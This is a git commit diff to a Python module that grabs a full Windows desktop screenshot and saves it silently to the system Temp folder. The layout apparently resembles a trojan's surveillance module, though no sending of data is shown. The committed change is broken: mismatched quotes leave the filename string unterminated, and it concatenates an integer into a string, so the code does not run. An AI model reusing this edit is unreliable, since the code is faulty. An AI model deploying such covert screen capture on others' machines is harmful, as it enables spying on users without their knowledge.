19dd362b203ff49fb501736fdb9970f14d9f1aa9
xxxkri <73106139+xxxkri@users.noreply.github.com>
2020-10-30 05:11:28 -0400

    Update screenshot.py

--- modules/screenshot.py
+++ modules/screenshot.py
@@ -2,6 +2,7 @@ import win32gui
 import win32ui
 import win32con
 import win32api
+import random
 
 # grab a handle to the main desktop window
 hdesktop = win32gui.GetDesktopWindow()
@@ -28,7 +29,7 @@ mem_dc.SelectObject(screenshot)
 mem_dc.BitBlt((0,0),(width,height),img_dc,(left,top),win32con.SRCCOPY)
 
 # save the bitmap to a file
-screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')
+screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot+"+random.randint(1,10000)+".bmp");
 
 # free our objects
 mem_dc.DeleteDC()
